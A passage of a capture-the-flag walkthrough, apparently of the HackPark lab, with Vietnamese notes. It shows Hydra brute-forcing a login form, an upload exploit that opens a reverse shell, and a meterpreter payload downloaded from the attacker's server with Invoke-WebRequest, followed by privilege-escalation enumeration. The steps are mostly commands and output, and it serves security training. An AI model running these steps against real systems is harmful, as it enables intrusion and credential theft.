<img width="1307" height="787" alt="image" src="https://github.com/user-attachments/assets/a6e40a7e-6a0c-43ac-86eb-470e0cee9c9e" />

<img width="1468" height="772" alt="image" src="https://github.com/user-attachments/assets/ea09f4b4-5466-4642-9184-61d0d23762f7" />

<img width="1423" height="782" alt="image" src="https://github.com/user-attachments/assets/b18f2926-7aad-4ad6-9e83-20b481de3fa6" />

<img width="930" height="416" alt="image" src="https://github.com/user-attachments/assets/55dd7c18-669c-46e1-bd9d-714d7b5d59d4" />

<img width="482" height="646" alt="image" src="https://github.com/user-attachments/assets/b9dc3cff-49d3-4ead-a8d3-5810acca33e2" />

Cu phap

`hydra -P <wordlist> -v <ip> <protocol>` 	<br>
`hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>` 	<br>
`hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>`<br>
`hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`

```
┌──(kali㉿kali)-[~]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.128.138.181 http-post-form "/Account/login.aspx:__VIEWSTATE=L6PhnOAYOX10Wv1GQ2lfq69aWRkCPC3PPBCdUyo8fXsLR9hKV4vetGeEXDoEMNGJJ3DXGBVYFKzKdEteQTbYGa2Lkwx5LgEbjpbnbuHXjGg%2BBrudqreMSwEF6d40JF%2Fjp8gbJ%2Fh2g29TXPCLNSzKhnixiBEjhwFUgwcm49pvPAT%2FfniguX&__EVENTVALIDATION=IsqZUVbBR05VkpVW0l8rIHJMSyJey2dLuxzAe8kRPA0zY9%2BBqMUlkseWwohgeCEePlls%2BBaIjk8pfNhFohPN5yJeLXX%2Bbq3s7%2FBIGc0Pnlw6kbWI33ohdhbJq7EySUSe992T%2BBmop0QQ5DaPgIxFDh5wDIVOribEQ1xYZUjn%2F2F06X%2FfxSdlyKn&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -f
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-16 10:40:57
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.128.138.181:80/Account/login.aspx:__VIEWSTATE=L6PhnOAYOX10Wv1GQ2lfq69aWRkCPC3PPBCdUyo8fXsLR9hKV4vetGeEXDoEMNGJJ3DXGBVYFKzKdEteQTbYGa2Lkwx5LgEbjpbnbuHXjGg%2BBrudqreMSwEF6d40JF%2Fjp8gbJ%2Fh2g29TXPCLNSzKhnixiBEjhwFUgwcm49pvPAT%2FfniguX&__EVENTVALIDATION=IsqZUVbBR05VkpVW0l8rIHJMSyJey2dLuxzAe8kRPA0zY9%2BBqMUlkseWwohgeCEePlls%2BBaIjk8pfNhFohPN5yJeLXX%2Bbq3s7%2FBIGc0Pnlw6kbWI33ohdhbJq7EySUSe992T%2BBmop0QQ5DaPgIxFDh5wDIVOribEQ1xYZUjn%2F2F06X%2FfxSdlyKn&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
[80][http-post-form] host: 10.128.138.181   login: admin   password: 1qaz2wsx
[STATUS] attack finished for 10.128.138.181 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-16 10:41:01
```
<img width="637" height="773" alt="image" src="https://github.com/user-attachments/assets/4a179d0b-ea2d-4eca-b87d-0b3881809438" />

<img width="796" height="495" alt="image" src="https://github.com/user-attachments/assets/d017e6b9-6ebe-4ccc-b22d-3ac92077b46c" />

Change IP_ATTACKER in `exploit.cs` file

<img width="942" height="457" alt="image" src="https://github.com/user-attachments/assets/8c2db326-1cfa-4644-b4f4-ec408d03e4b9" />

Click vao `Published posts` 

<img width="1905" height="617" alt="Screenshot 2026-07-17 105716" src="https://github.com/user-attachments/assets/593ce61c-1d5d-418f-8360-da010244414c" />

Click vào `Welcome to HackPark` để tải tệp `PostView.ascx` lên

<img width="842" height="193" alt="Screenshot 2026-07-17 105816" src="https://github.com/user-attachments/assets/2a32bc37-53af-4653-a990-3a21f2b428ff" />

<img width="575" height="371" alt="Screenshot 2026-07-17 110331" src="https://github.com/user-attachments/assets/2677c067-efce-42b1-a313-78dc65a917b6" />

Gõ `nc`

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -vnlp 4445     
listening on [any] 4445 ...
```

Thêm `?theme=../../App_Data/files` vào URL để kích hoạt

<img width="587" height="96" alt="Screenshot 2026-07-17 110443" src="https://github.com/user-attachments/assets/b6908455-4194-4e02-8daa-da26be5753fc" />

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -vnlp 4445     
listening on [any] 4445 ...
connect to [192.168.170.150] from (UNKNOWN) [10.112.140.135] 49289
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

```
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.8 LPORT=4444 -e x86/shikata_ga_nai -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: reverse.exe
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.112.140.135 - - [17/Jul/2026 06:10:14] "GET /reverse.exe HTTP/1.1" 200 -
````

```
c:\Windows\Temp>powershell -c "Invoke-WebRequest -Uri 'http://192.168.170.150:8000/reverse.exe' -OutFile 'C:\Windows\Temp\reverse.exe'"

c:\Windows\Temp>
dir
c:\Windows\Temp>dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of c:\Windows\Temp
07/17/2026  03:10 AM    <DIR>          .
07/17/2026  03:10 AM    <DIR>          ..
08/06/2019  02:13 PM             8,795 Amazon_SSM_Agent_20190806141239.log
08/06/2019  02:13 PM           181,468 Amazon_SSM_Agent_20190806141239_000_AmazonSSMAgentMSI.log
08/06/2019  02:13 PM             1,206 cleanup.txt
08/06/2019  02:13 PM               421 cmdout
08/06/2019  02:11 PM                 0 DMI2EBC.tmp
08/03/2019  10:43 AM                 0 DMI4D21.tmp
08/06/2019  02:12 PM             8,743 EC2ConfigService_20190806141221.log
08/06/2019  02:12 PM           292,438 EC2ConfigService_20190806141221_000_WiXEC2ConfigSetup_64.log
07/17/2026  02:22 AM    <DIR>          EC2Launch017155043
07/17/2026  02:42 AM    <DIR>          Microsoft
07/17/2026  03:10 AM            73,802 reverse.exe
08/06/2019  02:13 PM                21 stage1-complete.txt
08/06/2019  02:13 PM            28,495 stage1.txt
05/12/2019  09:03 PM           113,328 svcexec.exe
08/06/2019  02:13 PM                67 tmp.dat
              13 File(s)        708,784 bytes
               4 Dir(s)  38,984,822,784 bytes free
```

Sử dụng `metasploit`

`msfconsole`

```
msf > search multi/handler

Matching Modules
================

   #   Name                                                 Disclosure Date  Rank       Check  Description
   -   ----                                                 ---------------  ----       -----  -----------
   0   exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
   1   exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
   2   auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   3   exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
   4   exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
   5     \_ target: Linux x86                               .                .          .      .
   6     \_ target: Linux x86_64                            .                .          .      .
   7   exploit/multi/handler                                .                manual     No     Generic Payload Handler
   8   exploit/windows/mssql/mssql_linkcrawler              2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
   9   exploit/windows/browser/persits_xupload_traversal    2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
   10  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence


Interact with a module by name or index. For example info 10, use 10 or use exploit/linux/local/yum_package_manager_persistence                                                `
```

```
msf > use 7
[*] Using configured payload generic/shell_reverse_tcp
```

```
msf exploit(multi/handler) >  set lhost 192.168.170.150
lhost => 192.168.170.150
```

```
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```
```
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.170.150:4444 
```

Kích hoạt file `reserve.exe` trên máy Windows mục tiêu 
```
C:\Windows\Temp>.\reverse.exe
```

```
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.170.150:4444 
[*] Sending stage (177734 bytes) to 10.112.140.135
[*] Meterpreter session 43 opened (192.168.170.150:4444 -> 10.112.140.135:49555) at 2026-07-17 06:38:40 -0400

meterpreter >
```

```
meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 
```
```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User              Path
 ---   ----  ----                  ----  -------  ----              ----
 0     0     [System Process]
 4     0     System
 352   680   svchost.exe
 372   4     smss.exe
 532   524   csrss.exe
 588   576   csrss.exe
 596   524   wininit.exe
 624   576   winlogon.exe
 680   596   services.exe
 688   596   lsass.exe
 748   680   svchost.exe
 792   680   svchost.exe
 876   680   svchost.exe
 888   624   dwm.exe
 912   680   svchost.exe
 968   680   svchost.exe
 1000  680   svchost.exe
 1152  680   spoolsv.exe
 1180  680   amazon-ssm-agent.exe
 1264  680   svchost.exe
 1288  680   LiteAgent.exe
 1428  680   svchost.exe
 1448  680   svchost.exe
 1480  680   WService.exe
 1600  1480  WScheduler.exe
 1700  680   Ec2Config.exe
 1800  748   WmiPrvSE.exe
 2132  912   taskhostex.exe
 2340  2360  ServerManager.exe
 2396  2292  explorer.exe
 2420  680   svchost.exe
 2792  1856  badr.exe
 2884  680   msdtc.exe
 3152  2480  WScheduler.exe
 3180  3776  reverse.exe           x86   0        IIS APPPOOL\Blog  c:\Windows\Temp\reverse.exe
 3188  1448  w3wp.exe              x64   0        IIS APPPOOL\Blog  C:\Windows\System32\inetsrv\w3wp.exe
 3492  2792  conhost.exe
 3752  3776  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
 3776  3188  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe

```

<img width="955" height="432" alt="image" src="https://github.com/user-attachments/assets/a12f1bb5-bf32-4fc5-9a88-a875db555915" />

```
meterpreter > cd "c:/Program Files (x86)"
```
```
meterpreter > dir
Listing: c:\Program Files (x86)
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2013-08-22 11:39:30 -0400  Common Files
040777/rwxrwxrwx  4096  dir   2014-03-21 15:07:01 -0400  Internet Explorer
040777/rwxrwxrwx  0     dir   2013-08-22 11:39:30 -0400  Microsoft.NET
040777/rwxrwxrwx  8192  dir   2019-08-04 07:37:02 -0400  SystemScheduler
040777/rwxrwxrwx  0     dir   2019-08-06 17:12:04 -0400  Uninstall Information
040777/rwxrwxrwx  0     dir   2013-08-22 11:39:33 -0400  Windows Mail
040777/rwxrwxrwx  0     dir   2013-08-22 11:39:30 -0400  Windows NT
040777/rwxrwxrwx  0     dir   2013-08-22 11:39:30 -0400  WindowsPowerShell
100666/rw-rw-rw-  174   fil   2013-08-22 11:37:57 -0400  desktop.ini
```

```
meterpreter > cd Systemscheduler
```
```
meterpreter > dir
Listing: c:\Program Files (x86)\Systemscheduler
===============================================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040777/rwxrwxrwx  4096     dir   2026-07-17 23:51:34 -0400  Events
100666/rw-rw-rw-  60       fil   2019-08-04 07:36:42 -0400  Forum.url
100666/rw-rw-rw-  9813     fil   2004-11-16 02:16:34 -0500  License.txt
100666/rw-rw-rw-  1496     fil   2026-07-17 23:17:33 -0400  LogFile.txt
100666/rw-rw-rw-  3760     fil   2026-07-17 23:18:39 -0400  LogfileAdvanced.txt
100777/rwxrwxrwx  536992   fil   2018-03-25 13:58:56 -0400  Message.exe
100777/rwxrwxrwx  445344   fil   2018-03-25 13:59:00 -0400  PlaySound.exe
100777/rwxrwxrwx  27040    fil   2018-03-25 13:58:58 -0400  PlayWAV.exe
100666/rw-rw-rw-  149      fil   2019-08-04 18:05:19 -0400  Preferences.ini
100777/rwxrwxrwx  485792   fil   2018-03-25 13:58:58 -0400  Privilege.exe
100666/rw-rw-rw-  10100    fil   2018-03-24 15:09:04 -0400  ReadMe.txt
100777/rwxrwxrwx  112544   fil   2018-03-25 13:58:58 -0400  RunNow.exe
100777/rwxrwxrwx  235936   fil   2018-03-25 13:58:56 -0400  SSAdmin.exe
100777/rwxrwxrwx  731552   fil   2018-03-25 13:58:56 -0400  SSCmd.exe
100777/rwxrwxrwx  456608   fil   2018-03-25 13:58:58 -0400  SSMail.exe
100777/rwxrwxrwx  1633696  fil   2018-03-25 13:58:52 -0400  Scheduler.exe
100777/rwxrwxrwx  491936   fil   2018-03-25 13:59:00 -0400  SendKeysHelper.exe
100777/rwxrwxrwx  437664   fil   2018-03-25 13:58:56 -0400  ShowXY.exe
100777/rwxrwxrwx  439712   fil   2018-03-25 13:58:56 -0400  ShutdownGUI.exe
100666/rw-rw-rw-  785042   fil   2006-05-16 19:49:52 -0400  WSCHEDULER.CHM
100666/rw-rw-rw-  703081   fil   2006-05-16 19:58:18 -0400  WSCHEDULER.HLP
100777/rwxrwxrwx  136096   fil   2018-03-25 13:58:58 -0400  WSCtrl.exe
100777/rwxrwxrwx  68512    fil   2018-03-25 13:58:54 -0400  WSLogon.exe
100666/rw-rw-rw-  33184    fil   2018-03-25 13:59:00 -0400  WSProc.dll
100666/rw-rw-rw-  2026     fil   2006-05-16 18:58:18 -0400  WScheduler.cnt
100777/rwxrwxrwx  331168   fil   2018-03-25 13:58:52 -0400  WScheduler.exe
100777/rwxrwxrwx  98720    fil   2018-03-25 13:58:54 -0400  WService.exe
100666/rw-rw-rw-  54       fil   2019-08-04 07:36:42 -0400  Website.url
100777/rwxrwxrwx  76704    fil   2018-03-25 13:58:58 -0400  WhoAmI.exe
100666/rw-rw-rw-  1150     fil   2007-05-17 16:47:02 -0400  alarmclock.ico
100666/rw-rw-rw-  766      fil   2003-08-31 15:06:08 -0400  clock.ico
100666/rw-rw-rw-  80856    fil   2003-08-31 15:06:10 -0400  ding.wav
100666/rw-rw-rw-  1637972  fil   2009-01-08 22:21:48 -0500  libeay32.dll
100777/rwxrwxrwx  40352    fil   2018-03-25 13:59:00 -0400  sc32.exe
100666/rw-rw-rw-  766      fil   2003-08-31 15:06:26 -0400  schedule.ico
100666/rw-rw-rw-  355446   fil   2009-01-08 22:12:34 -0500  ssleay32.dll
100666/rw-rw-rw-  6999     fil   2019-08-04 07:36:42 -0400  unins000.dat
100777/rwxrwxrwx  722597   fil   2019-08-04 07:36:32 -0400  unins000.exe
100666/rw-rw-rw-  6574     fil   2009-06-26 20:27:32 -0400  whiteclock.ico
```
```
meterpreter > cd events
```
```
meterpreter > dir
Listing: c:\Program Files (x86)\Systemscheduler\events
======================================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  1925   fil   2026-07-17 23:52:33 -0400  20198415519.INI
100666/rw-rw-rw-  22502  fil   2026-07-17 23:52:33 -0400  20198415519.INI_LOG.txt
100666/rw-rw-rw-  290    fil   2020-10-02 17:50:12 -0400  2020102145012.INI
100666/rw-rw-rw-  186    fil   2026-07-17 23:48:27 -0400  Administrator.flg
100666/rw-rw-rw-  182    fil   2026-07-17 23:48:25 -0400  SYSTEM_svc.flg
100666/rw-rw-rw-  0      fil   2026-07-17 23:18:39 -0400  Scheduler.flg
100666/rw-rw-rw-  449    fil   2026-07-17 23:48:27 -0400  SessionInfo.flg
100666/rw-rw-rw-  0      fil   2026-07-17 23:50:06 -0400  service.flg
```
```
meterpreter > cat 20198415519.INI_LOG.txt

08/04/19 15:06:01,Event Started Ok, (Administrator)
08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)
08/04/19 15:07:00,Event Started Ok, (Administrator)
08/04/19 15:07:34,Process Ended. PID:2680,ExitCode:4,Message.exe (Administrator)
08/04/19 15:08:00,Event Started Ok, (Administrator)
08/04/19 15:08:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator)  [...]
```
```
c:\Windows\Temp>powershell -c "Invoke-WebRequest -Uri 'http://192.168.170.150:8000/winPEAS.bat' -OutFile 'C:\Windows\Temp\winPEAS.bat'"
```
```
c:\Windows\Temp>
dir
c:\Windows\Temp>dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of c:\Windows\Temp
07/17/2026  09:11 PM    <DIR>          .
07/17/2026  09:11 PM    <DIR>          ..
08/06/2019  02:13 PM             8,795 Amazon_SSM_Agent_20190806141239.log
08/06/2019  02:13 PM           181,468 Amazon_SSM_Agent_20190806141239_000_AmazonSSMAgentMSI.log
08/06/2019  02:13 PM             1,206 cleanup.txt
08/06/2019  02:13 PM               421 cmdout
08/06/2019  02:11 PM                 0 DMI2EBC.tmp
08/03/2019  10:43 AM                 0 DMI4D21.tmp
08/06/2019  02:12 PM             8,743 EC2ConfigService_20190806141221.log
08/06/2019  02:12 PM           292,438 EC2ConfigService_20190806141221_000_WiXEC2ConfigSetup_64.log
07/17/2026  08:18 PM    <DIR>          EC2Launch126647355
07/17/2026  08:22 PM    <DIR>          Microsoft
07/17/2026  08:22 PM            73,802 reverse.exe
08/06/2019  02:13 PM                21 stage1-complete.txt
08/06/2019  02:13 PM            28,495 stage1.txt
05/12/2019  09:03 PM           113,328 svcexec.exe
08/06/2019  02:13 PM                67 tmp.dat
07/17/2026  09:11 PM            38,904 winPEAS.bat
              14 File(s)        747,688 bytes
               4 Dir(s)  38,983,524,352 bytes free
```

